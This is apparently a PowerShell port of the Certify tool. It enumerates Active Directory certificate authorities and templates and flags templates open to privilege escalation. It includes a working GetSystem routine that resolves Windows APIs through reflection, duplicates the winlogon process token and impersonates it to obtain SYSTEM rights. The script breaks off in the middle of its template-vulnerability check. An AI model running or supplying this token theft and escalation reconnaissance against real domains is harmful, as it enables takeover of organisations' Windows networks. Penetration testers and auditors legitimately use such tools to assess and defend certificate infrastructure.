<# Copy Certify C# and pasted as Powershell ;) #>
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
Add-Type -AssemblyName System.Runtime.InteropServices

# Constantes
[Flags()] enum MS_PKI_CERTIFICATE_AUTHORITY_FLAG {
    NO_TEMPLATE_SUPPORT               = 0x00000001
    SUPPORTS_NT_AUTHENTICATION        = 0x00000002
    CA_SUPPORTS_MANUAL_AUTHENTICATION = 0x00000004
    CA_SERVERTYPE_ADVANCED            = 0x00000008
}

[Flags()] enum MS_PKI_ENROLLMENT_FLAG {
    None                                                     = 0x00000000
    IncludeSymmetricAlgorithms                               = 0x00000001
    PendAllRequests                                          = 0x00000002
    PublishToKraContainer                                    = 0x00000004
    PublishToDs                                              = 0x00000008
    AutoEnrollmentCheckUserDsCertificate                     = 0x00000010
    AutoEnrollment                                           = 0x00000020
    CtFlagDomainAuthenticationNotRequired                    = 0x80
    PreviousApprovalValidateReenrollment                     = 0x00000040
    UserInteractionRequired                                  = 0x00000100
    AddTemplateName                                          = 0x200
    RemoveInvalidCertificateFromPersonalStore                = 0x00000400
    AllowEnrollOnBehalfOf                                    = 0x00000800
    AddOcspNocheck                                           = 0x00001000
    EnableKeyReuseOnNtTokenKeysetStorageFull                 = 0x00002000
    Norevocationinfoinissuedcerts                            = 0x00004000
    IncludeBasicConstraintsForEeCerts                        = 0x00008000
    AllowPreviousApprovalKeybasedrenewalValidateReenrollment = 0x00010000
    IssuancePoliciesFromRequest                              = 0x00020000
    SkipAutoRenewal                                          = 0x00040000
    NoSecurityExtension                                      = 0x00080000
}

[Flags()] enum MS_PKI_CERTIFICATE_NAME_FLAG {
    NONE                                   = 0x00000000
    ENROLLEE_SUPPLIES_SUBJECT              = 0x00000001
    ADD_EMAIL                              = 0x00000002
    ADD_OBJ_GUID                           = 0x00000004
    OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME = 0x00000008
    ADD_DIRECTORY_PATH                     = 0x00000100
    ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME     = 0x00010000
    SUBJECT_ALT_REQUIRE_DOMAIN_DNS         = 0x00400000
    SUBJECT_ALT_REQUIRE_SPN                = 0x00800000
    SUBJECT_ALT_REQUIRE_DIRECTORY_GUID     = 0x01000000
    SUBJECT_ALT_REQUIRE_UPN                = 0x02000000
    SUBJECT_ALT_REQUIRE_EMAIL              = 0x04000000
    SUBJECT_ALT_REQUIRE_DNS                = 0x08000000
    SUBJECT_REQUIRE_DNS_AS_CN              = 0x10000000
    SUBJECT_REQUIRE_EMAIL                  = 0x20000000
    SUBJECT_REQUIRE_COMMON_NAME            = 0x40000000
    SUBJECT_REQUIRE_DIRECTORY_PATH         = 0x80000000
}

# https://github.com/PKISolutions/PSPKI/blob/master/PSPKI/Library/SysadminsLV.PKI.dll
[Flags()] enum CertSrvRights {
    ManageCA = 1
    ManageCertificates = 2
    Read = 256
    Enroll = 512
}

[Flags()] enum CA_EDIT_FLAGS {
    EDITF_ENABLEREQUESTEXTENSIONS  = 0x1
    EDITF_REQUESTEXTENSIONLIST     = 0x2
    EDITF_DISABLEEXTENSIONLIST     = 0x4
    EDITF_ADDOLDKEYUSAGE           = 0x8
    EDITF_ADDOLDCERTTYPE           = 0x10
    EDITF_ATTRIBUTEENDDATE         = 0x20
    EDITF_BASICCONSTRAINTSCRITICAL = 0x40
    EDITF_BASICCONSTRAINTSCA       = 0x80
    EDITF_ENABLEAKIKEYID           = 0x100
    EDITF_ATTRIBUTECA              = 0x200
    EDITF_IGNOREREQUESTERGROUP     = 0x400
    EDITF_ENABLEAKIISSUERNAME      = 0x800
    EDITF_ENABLEAKIISSUERSERIAL    = 0x1000
    EDITF_ENABLEAKICRITICAL        = 0x2000
    EDITF_SERVERUPGRADED           = 0x4000
    EDITF_ATTRIBUTEEKU             = 0x8000
    EDITF_ENABLEDEFAULTSMIME       = 0x10000
    EDITF_EMAILOPTIONAL            = 0x20000
    EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x40000
    EDITF_ENABLELDAPREFERRALS      = 0x80000
    EDITF_ENABLECHASECLIENTDC      = 0x100000
    EDITF_AUDITCERTTEMPLATELOAD    = 0x200000
    EDITF_DISABLEOLDOSCNUPN        = 0x400000
    EDITF_DISABLELDAPPACKAGELIST   = 0x800000
    EDITF_ENABLEUPNMAP             = 0x1000000
    EDITF_ENABLEOCSPREVNOCHECK     = 0x2000000
    EDITF_ENABLERENEWONBEHALFOF    = 0x4000000
}

[Flags()] enum COMMON_MISTAKES {
    NONE                                           = 0
    NO_ELEGIBLE                                    = 1
    OWNER_IS_A_LOW_PRIV_USER                       = 2
    LOW_PRIV_CAN_ENROLL                            = 4
    LOW_PRIV_USERS_HAVE_EDIT_RIGHTS                = 8
    MANAGER_APPROVAL_NOT_ENABLED                   = 16
    NOT_AUTHORIZED_SIGNATURES_REQUIRED             = 32
    HAS_AUTENTICATION_EKU                          = 64
    HAS_DANGEROUS_EKU                              = 128
    ENROLLEE_SUPPLIES_SUBJECT                      = 256
    SUBJECT_REQUIRE_DNS_WITHOUT_SECURITY_EXTENSION = 512
    VULNERABLE                                     = 1024
}

$COMMONS_OIDS = [PSCustomObject]@{
    AnyPurpose = New-Object System.Security.Cryptography.Oid("2.5.29.37.0")
    CertificateRequestAgent = New-Object System.Security.Cryptography.Oid("1.3.6.1.4.1.311.20.2.1")
    CertificateRequestAgentPolicy = New-Object System.Security.Cryptography.Oid("1.3.6.1.4.1.311.20.2.1")
    ClientAuthentication = New-Object System.Security.Cryptography.Oid("1.3.6.1.5.5.7.3.2")
    CodeSigning = New-Object System.Security.Cryptography.Oid("1.3.6.1.5.5.7.3.3")
    EncryptingFileSystem = New-Object System.Security.Cryptography.Oid("1.3.6.1.4.1.311.10.3.4")
    EncryptingMail = New-Object System.Security.Cryptography.Oid("1.3.6.1.5.5.7.3.4")
    KDCAuthentication = New-Object System.Security.Cryptography.Oid("1.3.6.1.5.2.3.5")
    PKINITClientAuthentication = New-Object System.Security.Cryptography.Oid("1.3.6.1.5.2.3.4")
    ServerAuthentication = New-Object System.Security.Cryptography.Oid("1.3.6.1.5.5.7.3.1")
    SmartCardLogon = New-Object System.Security.Cryptography.Oid("1.3.6.1.4.1.311.20.2.2")
}

# Reflexion helpers
Function Invoke-Method {
    Param (
        [Parameter(Mandatory=$True)][string]$Type,
        [Parameter(Mandatory=$True)][string]$Method,
        [Parameter(Mandatory=$False)][Object[]]$Parameters
    )
    $TypeRef = [Reflection.Assembly].Assembly.GetTypes() | Where-Object{ $_.FullName -eq $Type }
    $RuntimeMethodInfo = $TypeRef.DeclaredMethods | Where-Object{ $_.Name -eq $Method }
    $RuntimeMethodInfo.Invoke($null, $Parameters)
}

Function GetModuleHandle {
    Param (
        [Parameter(Mandatory=$True)][string]$Module
    )
    Invoke-Method -Type 'Microsoft.Win32.Win32Native' -Method 'GetModuleHandle' -Parameters @($Module)
}

Function GetProcAddress {
    Param (
        [Parameter(Mandatory=$True)][string]$Module,
        [Parameter(Mandatory=$True)][string]$Function
    )
    $GetModuleHandle = Invoke-Method -Type 'Microsoft.Win32.Win32Native' -Method 'GetModuleHandle' -Parameters @($Module)
    Invoke-Method -Type 'Microsoft.Win32.Win32Native' -Method 'GetProcAddress' -Parameters @($GetModuleHandle, $Function)
}

function Get-DelegateType
{
    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/ (As is 2012)
    Param
    (
        [AllowEmptyCollection()][OutputType([Type])] [Parameter(Mandatory=$True)][Type[]]$Parameters = (New-Object Type[](0)),
        [Parameter(Mandatory=$True)][Type]$ReturnType = [Void]
    )
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    $TypeBuilder.CreateType()
}

Function GetSystem {

    $OpenProcessTokenAddr = GetProcAddress -Module 'Advapi32' -Function 'OpenProcessToken'
    $OpenProcessTokenDelegate = Get-DelegateType -Parameters @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -ReturnType ([Bool])
    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)
    
    $DuplicateTokenAddr = GetProcAddress -Module 'Advapi32' -Function 'DuplicateToken'
    $DuplicateTokenDelegate = Get-DelegateType -Parameters @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -ReturnType ([Bool])
    $DuplicateToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenAddr, $DuplicateTokenDelegate)
    
    $ImpersonateLoggedOnUserAddr = GetProcAddress -Module 'Advapi32' -Function 'ImpersonateLoggedOnUser'
    $ImpersonateLoggedOnUserDelegate = Get-DelegateType -Parameters @([IntPtr]) -ReturnType ([Bool])
    $ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)
    
    $CloseHandleAddr = GetProcAddress -Module 'kernel32' -Function 'CloseHandle'
    $CloseHandleDelegate = Get-DelegateType -Parameters @([IntPtr]) -ReturnType ([Bool])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
    $process = Get-Process -name winlogon
    [IntPtr]$hProcToken = [IntPtr]::Zero
    $success = $OpenProcessToken.Invoke($process.handle, 0x0002, [ref]$hProcToken)
    [IntPtr]$hDupToken = [IntPtr]::Zero
    $success = $DuplicateToken.Invoke($hProcToken, 0x02, [ref]$hDupToken)
    $success = $ImpersonateLoggedOnUser.Invoke($hDupToken)
    $success = $CloseHandle.Invoke($hProcToken)
    $success = $CloseHandle.Invoke($hDupToken)
      
}

Function RevertToSelf {
    $RevertToSelfAddr = GetProcAddress -Module "advapi32" -Function "RevertToSelf"
    $RevertToSelfDelegate = Get-DelegateType -Parameters @() -ReturnType ([Bool])
    $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)   
    $RevertToSelf.Invoke()
}


# Operaciones LDAP basicas y tratamiento de resultados
Function LDAPQuery {
    [OutputType([System.DirectoryServices.SearchResultCollection])]
    Param(
        [Parameter(Mandatory=$False)][string]$OU,
        [Parameter(Mandatory=$False)][string]$Filter,
        [Parameter(Mandatory=$False)][System.DirectoryServices.SecurityMasks]$Masks
    )

    $ConfigurationPath = ([ADSI]"LDAP://RootDSE").Properties.ConfigurationNamingContext
    If (!$PSBoundParameters.ContainsKey('OU')) {
        $TargetOU = $ConfigurationPath
    } Else {
        $TargetOU = "$($OU),$($ConfigurationPath)"
    }
    
    $Searcher = New-Object DirectoryServices.DirectorySearcher
    $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$TargetOU")
    $Searcher.SearchScope = "Subtree"
    $Searcher.ClientTimeout = 25
    If ($PSBoundParameters.ContainsKey('Masks')) {
        $Searcher.SecurityMasks = $Masks
    }
    If ($PSBoundParameters.ContainsKey('Filter')) {
        $Searcher.Filter = $Filter
    } 
    
    try {
        return $Searcher.FindAll()
    } catch {
        return $null
    }
}

Function ParseName() {
    [OutputType([string])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    if ($sr.Properties.Contains('name')) {
        return $sr.Properties.name[0]
    } Else {
        return $null
    }
}

Function ParseDomainName() {
    [OutputType([string])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    $dn = $sr.Path
    $IdxDc = $dn.IndexOf("DC=")
    $dName = (($dn[($IdxDc + 3)..($dn.Length)]) -Join "").Replace(",DC=", ".")
    return $dName
}

Function ParseGuid() {
    [OutputType([System.Guid])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    if ($sr.Properties.Contains('objectguid')) {
        return New-Object -TypeName System.Guid -ArgumentList @(, $sr.Properties.objectguid[0])
    } Else {
        return $null
    }
}

Function ParseDnsHostname() {
    [OutputType([string])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    if ($sr.Properties.Contains('dnshostname')) {
        return $sr.Properties.dnshostname[0].ToString()
    } Else {
        return $null
    }
}

Function ParsePkiCertificateAuthorityFlags() {
    [OutputType([MS_PKI_CERTIFICATE_AUTHORITY_FLAG])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    if ($sr.Properties.Contains('flags')) {
        return [MS_PKI_CERTIFICATE_AUTHORITY_FLAG]$sr.Properties.flags[0]
    } Else {
        return $null
    }
}

Function ParseSecurityDescriptor() {
    [OutputType([System.DirectoryServices.ActiveDirectorySecurity])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    If ($sr.Properties.Contains('ntsecuritydescriptor')) {
        $ADSec = New-Object -TypeName System.DirectoryServices.ActiveDirectorySecurity
        $ADSec.SetSecurityDescriptorBinaryForm($sr.Properties.ntsecuritydescriptor[0])
        return $ADSec
    } Else {
        return $null
    }
}

Function ParseCACertificate() {
    [OutputType([System.Security.Cryptography.X509Certificates.X509Certificate2[]])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    $certs = @()
    If ($sr.Properties.Contains("cacertificate")) {
        $sr.Properties.cacertificate | ForEach-Object {
            $bytes = $_
            $cert = new-object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList @(, $bytes)
            $certs += $cert
        }
        return $certs
    } Else {
        return $null
    }
}

Function ParseSchemaVersion() {
    [OutputType([Int])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    If ($sr.Properties.Contains("mspki-template-schema-version")) {
        return $sr.Properties."mspki-template-schema-version"[0]
    } Else {
        return $null
    }
}

Function ParseDisplayName() {
    [OutputType([string])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    If ($sr.Properties.Contains("displayname")) {
        return $sr.Properties.displayname[0]
    } Else {
        return $null
    }
}

Function ConvertPKIPeriod() {
    [OutputType([string])]
    Param(
        [Parameter(Mandatory=$True)][Byte[]]$ByteArray
    )
    If ($ByteArray -ne $null) {
        [array]::Reverse($ByteArray)
        $LittleEndianByte = -join ($ByteArray | %{"{0:x2}" -f $_})
        $Value = [Convert]::ToInt64($LittleEndianByte,16) * -.0000001
        if (!($Value % 31536000) -and ($Value / 31536000) -ge 1) { return [string]($Value / 31536000) + " years"}
        elseif (!($Value % 2592000) -and ($Value / 2592000) -ge 1) { return [string]($Value / 2592000) + " months"}
        elseif (!($Value % 604800) -and ($Value / 604800) -ge 1) { return [string]($Value / 604800) + " weeks"}
        elseif (!($Value % 86400) -and ($Value / 86400) -ge 1) { return [string]($Value / 86400) + " days"}
        elseif (!($Value % 3600) -and ($Value / 3600) -ge 1) { return [string]($Value / 3600) + " hours"}
        else { return "0 hours"}
    } Else {
        return "0 hours"
    }
}

Function ParsePkiExpirationPeriod() {
    [OutputType([string])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    If ($sr.Properties.Contains("pkiexpirationperiod")) {
        return ConvertPKIPeriod($sr.Properties.pkiexpirationperiod[0])
        #return $null
    } Else {
        return $null
    }
}

Function ParsePkiOverlapPeriod() {
    [OutputType([string])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    If ($sr.Properties.Contains("pkioverlapperiod")) {
        return ConvertPKIPeriod($sr.Properties.pkioverlapperiod[0])
    } Else {
        return $null
    }
}

Function ParsePkiCertTemplateOid() {
    [OutputType([System.Security.Cryptography.Oid[]])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    $oids = @()
    If ($sr.Properties.Contains("mspki-cert-template-oid")) {
        $sr.Properties."mspki-cert-template-oid" | %{
            $oids += New-Object System.Security.Cryptography.Oid($_)
        }
    } Else {
        return @()
    }    
    return $oids
}

Function ParsePkiEnrollmentFlag() {
    [OutputType([MS_PKI_ENROLLMENT_FLAG])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    if ($sr.Properties.Contains('mspki-enrollment-flag')) {
        return [MS_PKI_ENROLLMENT_FLAG]$sr.Properties."mspki-enrollment-flag"[0]
    } Else {
        return 0
    }
}

Function ParsePkiCertificateNameFlag() {
    [OutputType([MS_PKI_CERTIFICATE_NAME_FLAG])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    if ($sr.Properties.Contains('mspki-certificate-name-flag')) {
        return [MS_PKI_CERTIFICATE_NAME_FLAG]$sr.Properties."mspki-certificate-name-flag"[0]
    } Else {
        return 0
    }
}

Function ParseExtendedKeyUsages() {
    [OutputType([System.Security.Cryptography.Oid[]])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    $ekus = @()
    if ($sr.Properties.Contains('pkiextendedkeyusage')) {
        $sr.Properties."pkiextendedkeyusage" | %{
            $ekus += New-Object System.Security.Cryptography.Oid($_)
        }
    } Else {
        return @()
    }
    return $ekus
}

Function ParseAuthorizedSignatures() {
    [OutputType([Int])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    if ($sr.Properties.Contains('mspki-ra-signature')) {
        return $sr.Properties."mspki-ra-signature"[0]
    } Else {
        return $null
    }
}

Function ParseRaApplicationPolicies() {
    [OutputType([System.Security.Cryptography.Oid[]])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    $policies = @()
    if ($sr.Properties.Contains('mspki-ra-application-policies')) {
        $sr.Properties."mspki-ra-application-policies" | %{
            $policies += New-Object System.Security.Cryptography.Oid($_)
        }
    } Else {
        return $null
    }
    return $policies
}

Function ParseIssuancePolicies() {
    [OutputType([System.Security.Cryptography.Oid[]])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    $policies = @()
    if ($sr.Properties.Contains('mspki-ra-policies')) {
        $sr.Properties."mspki-ra-policies" | %{
            $policies += New-Object System.Security.Cryptography.Oid($_)
        }
    } Else {
        return $null
    }
    return $policies
}

Function ParseCertificateApplicationPolicies() {
    [OutputType([System.Security.Cryptography.Oid[]])]
    Param(
        [Parameter(Mandatory=$True)][System.DirectoryServices.SearchResult]$sr
    )
    $policies = @()
    if ($sr.Properties.Contains('mspki-certificate-application-policy')) {
        $sr.Properties."mspki-certificate-application-policy" | %{
            $policies += New-Object System.Security.Cryptography.Oid($_)
        }
    } Else {
        return $null
    }
    return $policies
}

Function GetEnterpriseCAs() {
    [OutputType([PSCustomObject[]])]
    Param(
        [Parameter(Mandatory=$False)][string]$caName
    )
    If (!$PSBoundParameters.ContainsKey('caName')) {
        $caName = "*"
    }
    $CAsObjects = @()
    $ResultObjects = LDAPQuery -OU "CN=Enrollment Services,CN=Public Key Services,CN=Services" -Filter ("(&(objectCategory=pKIEnrollmentService)(name={0}))" -f $caName)
    $ResultObjects | %{
        $Result = $_
        If ($Result -ne $null) {
            $templates = @()
            $Result.Properties.certificatetemplates | %{$templates += $_}
            $CAsObjects += [PSCustomObject]@{
                distinguisedName = $Result.Path
                name = ParseName($Result)
                domainName = ParseDomainName($Result)
                guid = ParseGuid($Result)
                dnsHostname = ParseDnsHostname($Result)
                flags = ParsePkiCertificateAuthorityFlags($Result)
                certificates = ParseCACertificate($Result)
                securityDescriptor = ParseSecurityDescriptor($Result)
                templates = $templates
            }
        }
    }
    return $CAsObjects
}

Function GetNtAuthCertificates() {
    [OutputType([PSCustomObject[]])]
    Param()
    $NTCas = @()
    $NTCasResults = LDAPQuery -OU "CN=NTAuthCertificates,CN=Public Key Services,CN=Services" -Filter "(objectClass=certificationAuthority)"
    If ($NTCasResults.Count -eq 1) {
        $NTCas += [PSCustomObject]@{
            distinguisedName = $NTCasResults[0].Path
            name = ParseName($NTCasResults[0])
            domainName = ParseDomainName($NTCasResults[0])
            guid = ParseGuid($NTCasResults[0])
            flags = $null
            certificates = ParseCACertificate($NTCasResults[0])
            securityDescriptor = ParseSecurityDescriptor($NTCasResults[0])
        }
        return $NTCas
    } Else {
        return $null
    }
}

Function GetRootCAs() {
    [OutputType([PSCustomObject[]])]
    Param()
    $RootCas = @()
    $RootCasResults = LDAPQuery -OU "CN=Certification Authorities,CN=Public Key Services,CN=Services" -Filter "(objectCategory=certificationAuthority)"
    $RootCasResults | %{
        $Result = $_
        $RootCas += [PSCustomObject]@{
            distinguisedName = $Result.Path
            name = ParseName($Result)
            domainName = ParseDomainName($Result)
            guid = ParseGuid($Result)
            flags = $null
            certificates = ParseCACertificate($Result)
            securityDescriptor = ParseSecurityDescriptor($Result)
        }
    }
    return $RootCas
}

Function GetCertificateTemplates() {
    [OutputType([PSCustomObject[]])]
    Param()
    $GenericMask = [System.DirectoryServices.SecurityMasks]'Dacl' -bor [System.DirectoryServices.SecurityMasks]'Owner'
    $Templates = @()
    $TemplateResults = LDAPQuery -OU "CN=Certificate Templates,CN=Public Key Services,CN=Services" -Filter "(objectclass=pKICertificateTemplate)" -Masks $GenericMask
    $TemplateResults | %{
        $Result = $_
        $Templates += [PSCustomObject]@{
            distinguisedName = $Result.Path
            name = ParseName($Result)
            domainName = ParseDomainName($Result)
            guid = ParseGuid($Result)
            schemaVersion = ParseSchemaVersion($Result)
            displayName = ParseDisplayName($Result)
            validityPeriod = ParsePkiExpirationPeriod($Result)
            renewalPeriod = ParsePkiOverlapPeriod($Result)
            oid = ParsePkiCertTemplateOid($Result)
            certificateNameFlag  = ParsePkiCertificateNameFlag($Result)                
            enrollmentFlag = ParsePkiEnrollmentFlag($Result)
            extendedKeyUsage = ParseExtendedKeyUsages($Result)
            authorizedSignatures = ParseAuthorizedSignatures($Result)
            raApplicationPolicies = ParseRaApplicationPolicies($Result)
            issuancePolicies = ParseIssuancePolicies($Result)
            securityDescriptor = ParseSecurityDescriptor($Result)
            applicationPolicies = ParseCertificateApplicationPolicies($Result)
        }            
    }
    return $Templates
}

# Operaciones genericas con plantillas, certificados y CAs

Function GetServerSecurityFromRegistry {
    [OutputType([System.DirectoryServices.ActiveDirectorySecurity])]
    Param(
        [Parameter(Mandatory=$True)][string]$dnsHostname,
        [Parameter(Mandatory=$True)][string]$caName
    )    
    try {
        $base = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $dnsHostname)
        $key  = $base.OpenSubKey(("SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{0}" -f $caName))
        $regSecurity = $key.GetValue("Security")
        $securityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
        $securityDescriptor.SetSecurityDescriptorBinaryForm($regSecurity, [System.Security.AccessControl.AccessControlSections]::All)
        return $securityDescriptor
    } catch { 
        Write-Warning $Error[0]
        return $null
    }
}

Function GetServerEditflagsFromRegistry {
    [OutputType([CA_EDIT_FLAGS])]
    Param(
        [Parameter(Mandatory=$True)][string]$dnsHostname,
        [Parameter(Mandatory=$True)][string]$caName
    )  
    try {
        $base = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $dnsHostname)
        $key  = $base.OpenSubKey(("SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{0}\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy" -f $caName))
        return [CA_EDIT_FLAGS]$key.GetValue("EditFlags")
    } catch { 
        Write-Warning $Error[0]
        return $null
    }
}

Function GetServerEnrollmentRightsFromRegistry {
    [OutputType([System.Security.AccessControl.RawSecurityDescriptor])]
    Param(
        [Parameter(Mandatory=$True)][string]$dnsHostname,
        [Parameter(Mandatory=$True)][string]$caName
    ) 
    try {
        $base = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $dnsHostname)
        $key  = $base.OpenSubKey(("SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{0}" -f $caName))
        $regSecurity = $key.GetValue("EnrollmentAgentRights")
        If ($regSecurity -eq $null) {
            return $null
        } Else {
            $rawSecurityDescriptor = New-Object System.Security.AccessControl.RawSecurityDescriptor($regSecurity, 0)
            return $rawSecurityDescriptor
        }
    } catch { 
        Write-Warning $Error[0]
        return $null
    }
}

Function findCAs {
    [OutputType([PSCustomObject])]
    Param() 
    return [PSCustomObject]@{
        RootCAs = GetRootCAs
        NTAuthCertificates = GetNtAuthCertificates
        EnterpriseCAs = GetEnterpriseCAs
    }
}

Function findTemplates {
    [OutputType([PSCustomObject[]])]
    Param()
    return GetCertificateTemplates
}

Function findVulnerableTemplates {
    [OutputType([PSCustomObject[]])]
    Param() 
    $templates = findTemplates
    $vulnerable = @()
    $templates | %{
        $template = $_
        $mistakes = $null
        $mistakes = IsTemplateVulnerable($template)
        If ($mistakes.HasFlag([COMMON_MISTAKES]::VULNERABLE)) {
            $template | Add-Member -Name 'mistakes' -Type NoteProperty -Value $mistakes
            $vulnerable += $template
        }
    }
    return $vulnerable
}

Function IsTemplateVulnerable {
    [OutputType([COMMON_MISTAKES])]
    Param(
        [Parameter(Mandatory=$True)][PSCustomObject]$Template
    ) 

    $result = [COMMON_MISTAKES]::NONE
    $ownerSID = $Template.securityDescriptor.GetOwner([System.Security.Principal.SecurityIdentifier])

    # 1.- Is the owner a low-privileged user?
    If (IsLowPrivSid -sid $ownerSID.ToString()) {
        If (!$result.HasFlag([COMMON_MISTAKES]::OWNER_IS_A_LOW_PRIV_USER)) {$result += [COMMON_MISTAKES]::OWNER_IS_A_LOW_PRIV_USER}
        If (!$result.HasFlag([COMMON_MISTAKES]::VULNERABLE)) {$result += [COMMON_MISTAKES]::VULNERABLE}
    }

    # 2.- Do low-privileged users/the current user have edit rights over the template ?
    $lowPrivilegedUsersCanEnroll = $false
    $dangerousACLs = $false
    $accessRules = $Template.securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
    $accessRules | %{
        $rule = $_
        If (
            ($rule.AccessControlType -eq [System.Security.AccessControl.AccessControlType]::Allow) -and 
            (IsLowPrivSid -sid $rule.IdentityReference.ToString()) -and 
            (
                ($rule.ActiveDirectoryRights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::GenericAll)) -or
                ($rule.ActiveDirectoryRights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteOwner)) -or
                ($rule.ActiveDirectoryRights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteDacl)) -or
                (
                    ($rule.ActiveDirectoryRights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteProperty)) -and
                    ($rule.ObjectType.Guid -eq '00000000-0000-0000-0000-000000000000')
                )
            )
        ) {
            If (!$result.HasFlag([COMMON_MISTAKES]::LOW_PRIV_USERS_HAVE_EDIT_RIGHTS)) {$result += [COMMON_MISTAKES]::LOW_PRIV_USERS_HAVE_EDIT_RIGHTS}
            If (!$result.HasFlag([COMMON_MISTAKES]::VULNERABLE)) {$result += [COMMON_MISTAKES]::VULNERABLE}
            $dangerousACLs = $true
        } ElseIf (
            ($rule.AccessControlType -eq [System.Security.AccessControl.AccessControlType]::Allow) -and 
            (IsLowPrivSid -sid $rule.IdentityReference.ToString()) -and 
            (
                ($rule.ActiveDirectoryRights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight)) -and
                (                        
                    ($rule.ObjectType.Guid -eq '0e10c968-78fb-11d2-90d4-00c04f79dc55') -or
                    ($rule.ObjectType.Guid -eq '00000000-0000-0000-0000-000000000000')
                )
            )
        ) {
            If (!$result.HasFlag([COMMON_MISTAKES]::LOW_PRIV_CAN_ENROLL)) {$result += [COMMON_MISTAKES]::LOW_PRIV_CAN_ENROLL}
            $lowPrivilegedUsersCanEnroll = $true
        }
    }
    
    # 3.- Is manager approval enabled ?
    $requiresManagerApproval = (
            ($Template.enrollmentFlag -ne $null) -and 
            ([MS_PKI_ENROLLMENT_FLAG]$Template.enrollmentFlag).HasFlag([MS_PKI_ENROLLMENT_FLAG]::PendAllRequests)
    )
    If (!$requiresManagerApproval) { 
        If (!$result.HasFlag([COMMON_MISTAKES]::MANAGER_APPROVAL_NOT_ENABLED)) {$result += [COMMON_MISTAKES]::MANAGER_APPROVAL_NOT_ENABLED}
    }

    # 4.- Are there now authorized signatures required?
    If ($Template.authorizedSignatures -gt 0) { 
        If (!$result.HasFlag([COMMON_MISTAKES]::NOT_AUTHORIZED_SIGNATURES_REQUIRED)) {$result += [COMMON_MISTAKES]::NOT_AUTHORIZED_SIGNATURES_REQUIRED}
    }
    
    # 5.- If a low priv'ed user can request a cert with EKUs used for authentication and ENROLLEE_SUPPLIES_SUBJECT is enabled, then privilege escalation is possible
